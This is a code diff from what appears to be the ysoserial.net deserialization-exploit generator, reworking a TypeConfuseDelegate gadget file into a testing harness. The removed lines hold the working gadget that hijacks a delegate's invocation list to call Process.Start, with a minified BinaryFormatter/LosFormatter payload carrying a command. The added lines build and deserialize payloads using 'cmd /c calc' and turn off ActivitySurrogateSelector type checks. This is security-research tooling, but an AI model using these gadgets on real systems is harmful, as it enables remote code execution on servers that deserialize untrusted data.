@@ -1,50 +1,141 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Diagnostics;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using NDesk.Options;
+using ysoserial.Generators;
 using System.IO;
-using System.Reflection;
-using ysoserial.Helpers;
+using System.Diagnostics;
+using Newtonsoft.Json.Linq;
+using System.Text.RegularExpressions;
 using ysoserial.Helpers.ModifiedVulnerableBinaryFormatters;
+using System.Web.UI.WebControls;
+using System.Configuration;
 
-namespace ysoserial.Generators
+namespace ysoserial.Helpers.TestingArena
 {
-    public class TypeConfuseDelegateGenerator : GenericGenerator
+    // This can be used for testing purposes
+    // Some samples have been included here
+    class TestingArenaHome : GenericGenerator
     {
-        public override string Name()
-        {
-            return "TypeConfuseDelegate";
-        }
+        private InputArgs inputArgs = new InputArgs();
+        private InputArgs sampleInputArgs = new InputArgs("cmd /c calc", true, false, false, false, true, null);
+        private string testarg = "";
 
-        public override string Finders()
+        public override OptionSet Options()
         {
-            return "James Forshaw";
-        }
-
-        public override string Contributors()
-        {
-            return "Alvaro Munoz";
-        }
-
-        public override List<string> Labels()
-        {
-            return new List<string> { GadgetTypes.NotBridgeNotDerived };
-        }
-
-
-        public override List<string> SupportedFormatters()
-        {
-            return new List<string> { "BinaryFormatter", "NetDataContractSerializer", "LosFormatter" };
-        }
-
-        public override object Generate(string formatter, InputArgs inputArgs)
-        {
-            if(inputArgs.Minify && inputArgs.UseSimpleType && 
-                (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase) || formatter.Equals("LosFormatter", StringComparison.OrdinalIgnoreCase)))
+            OptionSet options = new OptionSet()
             {
-                // This is to provide even a smaller payload
-                inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;
-                
-                string tcd_json_minified = @"[{'Id': 1,
+                {"testarg", "This is a new string argument as an example", v => v = testarg},
+            };
+
+            return options;
+        }
+
+        public void Start(InputArgs inputArgs)
+        {
+            this.inputArgs = inputArgs;
+            //MinimiseTCDJsonAndRun();
+            //ManualTCDGPayload4Minifying();
+            //TextFormatterMinifying();
+            //ActivitySurrogateSelector();
+            Console.ReadLine();
+        }
+
+        private void ActivitySurrogateSelector()
+        {
+            string myApp = "TestConsoleApp_YSONET";
+            sampleInputArgs = new InputArgs(myApp + " /foo bar", true, true, true, true, true, null);
+            bool isErrOk = false;
+
+            PayloadClass myPayloadClass = new PayloadClass(1, sampleInputArgs);
+
+            List<object> ls = myPayloadClass.GadgetChains();
+            //*
+            // Disable ActivitySurrogate type protections during generation
+            ConfigurationManager.AppSettings.Set("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck", "true");
+
+            //Serialize(myPayloadClass, "BinaryFormatter", sampleInputArgs);
+            MemoryStream lsMs = new MemoryStream();
+
+            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
+            fmt.SurrogateSelector = new MySurrogateSelector();
+            fmt.Serialize(lsMs, ls);
+            //lsMs.Position = 0;
+            //fmt.Deserialize(lsMs);
+            
+            byte[] bf_byte = lsMs.ToArray();
+            Console.WriteLine("Init size: " + bf_byte.Length);
+            string json_string = AdvancedBinaryFormatterParser.StreamToJson(new MemoryStream(bf_byte), false, true, true);
+
+            //MemoryStream msCanIt = AdvancedBinaryFormatterParser.JsonToStream(json_string);
+            //msCanIt.Position = 0;
+            //fmt.Deserialize(msCanIt);
+
+            string result = BinaryFormatterMinifier.MinimiseJsonAndRun(json_string, sampleInputArgs, isErrOk, true);
+
+            Console.WriteLine(result);
+            MemoryStream ms = AdvancedBinaryFormatterParser.JsonToStream(result);
+            Console.WriteLine("Final size: " + ms.Length);
+            Console.ReadLine();
+
+        }
+
+        private void TextFormatterMinifying()
+        {
+            string myApp = "TestConsoleApp_YSONET";
+            sampleInputArgs = new InputArgs(myApp + " /foo bar", true, false, true, true, true, null);
+            bool isErrOk = false;
+
+            TextFormattingRunPropertiesGenerator generator = new TextFormattingRunPropertiesGenerator();
+            byte[] tcd_bf_byte = (byte[])generator.GenerateWithNoTest("binaryformatter", sampleInputArgs);
+            Console.WriteLine("Init size: " + tcd_bf_byte.Length);
+            string json_string = AdvancedBinaryFormatterParser.StreamToJson(new MemoryStream(tcd_bf_byte), false, true, true);
+
+            string result = BinaryFormatterMinifier.MinimiseJsonAndRun(json_string, sampleInputArgs, isErrOk, true);
+            Console.WriteLine(result);
+            MemoryStream ms = AdvancedBinaryFormatterParser.JsonToStream(result);
+            Console.WriteLine("Final size: " + ms.Length);
+            Console.ReadLine();
+
+        }
+
+        // this has been used as an example to minify the TypeConfuseDelegateGenerator payload!
+        private void MinimiseTCDJsonAndRun()
+        {
+            string myApp = "TestConsoleApp_YSONET";
+            sampleInputArgs = new InputArgs(myApp + " /foo bar", true, false, false, false, true, null);
+            bool isErrOk = false;
+            
+            TypeConfuseDelegateGenerator tcdg = new TypeConfuseDelegateGenerator();
+            byte[] tcd_bf_byte = (byte[])tcdg.GenerateWithNoTest("binaryformatter", sampleInputArgs);
+            string json_string = AdvancedBinaryFormatterParser.StreamToJson(new MemoryStream(tcd_bf_byte), false, true, true);
+
+            byte[] result = BinaryFormatterMinifier.MinimiseBFAndRun(tcd_bf_byte, sampleInputArgs, isErrOk, true);
+
+            Console.WriteLine(Encoding.UTF8.GetString(result));
+            Console.ReadLine();
+        }
+
+        private void ManualTCDGPayload4Minifying()
+        {
+
+
+            /*
+            sampleInputArgs.Minify = true;
+            sampleInputArgs.UseSimpleType = true;
+
+            object tcd = TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(sampleInputArgs);
+
+            TypeConfuseDelegateGenerator tcdg = new TypeConfuseDelegateGenerator();
+            byte[] tcd_bf_byte = (byte[]) tcdg.GenerateWithNoTest("binaryformatter", sampleInputArgs);
+            string tcd_json = AdvancedBinaryFormatterParser.StreamToJson(new MemoryStream(tcd_bf_byte),false, true);
+            Console.WriteLine(tcd_json);
+            //*/
+
+            //*
+            string tcd_json = @"[{'Id': 1,
     'Data': {
       '$type': 'SerializationHeaderRecord',
       'binaryFormatterMajorVersion': 1,
@@ -135,13 +226,13 @@ namespace ysoserial.Generators
     'Data': {
       '$type': 'BinaryObjectString',
       'objectId': 6,
-      'value': '" + inputArgs.CmdArguments + @"'
+      'value': '/foo bar'
 }},{'Id': 12,
     'TypeName': 'ObjectString',
     'Data': {
       '$type': 'BinaryObjectString',
       'objectId': 7,
-      'value': '" + inputArgs.CmdFileName + @"'
+      'value': 'TestConsoleApp_YSONET'
 }},{'Id': 13,
     'TypeName': 'ObjectWithMapTyped',
     'Data': {
@@ -359,89 +450,40 @@ namespace ysoserial.Generators
       '$type': 'MessageEnd'
 }}]";
 
-                MemoryStream ms_bf = AdvancedBinaryFormatterParser.JsonToStream(tcd_json_minified);
-                if(formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
-                {
-                    //BinaryFormatter
-                    if (inputArgs.Test)
-                    {
-                        try
-                        {
-                            ms_bf.Position = 0;
-                            SerializersHelper.BinaryFormatter_deserialize(ms_bf);
-                        }
-                        catch (Exception err)
-                        {
-                            Debugging.ShowErrors(inputArgs, err);
-                        }
-                    }
-                    return ms_bf.ToArray();
-                }
-                else
-                {
-                    // LosFormatter
-                    MemoryStream ms_lf = SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(ms_bf);
-
-                    if (inputArgs.Test)
-                    {
-                        try
-                        {
-                            ms_bf.Position = 0;
-                            SerializersHelper.LosFormatter_deserialize(ms_lf.ToArray());
-                        }
-                        catch (Exception err)
-                        {
-                            Debugging.ShowErrors(inputArgs, err);
-                        }
-                    }
-                    return ms_lf.ToArray();
-                }
+            MemoryStream ms = AdvancedBinaryFormatterParser.JsonToStream(tcd_json);
+            try
+            {
+                string lfStr = Encoding.UTF8.GetString(SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(ms).ToArray());
+                Console.WriteLine("Length: " + lfStr.Length);
+                SerializersHelper.LosFormatter_deserialize(lfStr);
             }
-            else
-                return Serialize(TypeConfuseDelegateGadget(inputArgs), formatter, inputArgs);
+            catch
+            {
+                Console.WriteLine("Error");
+            }
+
+            //*/
+
         }
 
-        /* this can be used easily by the plugins as well */
-
-        // This is for those plugins that only accepts cmd and do not want to use any of the input argument features such as minification
-        public static object TypeConfuseDelegateGadget(string cmd)
+        public override object Generate(string formatter, InputArgs inputArgs)
         {
-            InputArgs inputArgs = new InputArgs();
-            inputArgs.Cmd = cmd;
-            return TypeConfuseDelegateGadget(inputArgs);
+            throw new NotImplementedException();
         }
 
-        public static object TypeConfuseDelegateGadget(InputArgs inputArgs)
+        public override string Finders()
         {
-            string cmdFromFile = inputArgs.CmdFromFile;
-
-            if (!string.IsNullOrEmpty(cmdFromFile))
-            {
-                inputArgs.Cmd = cmdFromFile;
-            }
-            
-            Delegate da = new Comparison<string>(String.Compare);
-            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
-            IComparer<string> comp = Comparer<string>.Create(d);
-            SortedSet<string> set = new SortedSet<string>(comp);
-            set.Add(inputArgs.CmdFileName);
-            if (inputArgs.HasArguments)
-            {
-                set.Add(inputArgs.CmdArguments);
-            }
-            else
-            {
-                set.Add(""); // this is needed (as Process.Start accepts two args)
-            }
-            
-            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
-            object[] invoke_list = d.GetInvocationList();
-            // Modify the invocation list to add Process::Start(string, string)
-            invoke_list[1] = new Func<string, string, Process>(Process.Start);
-            fi.SetValue(d, invoke_list);
-
-            return set;
+            throw new NotImplementedException();
         }
 
+        public override string Name()
+        {
+            throw new NotImplementedException();
+        }
+
+        public override List<string> SupportedFormatters()
+        {
+            throw new NotImplementedException();
+        }
     }
 }
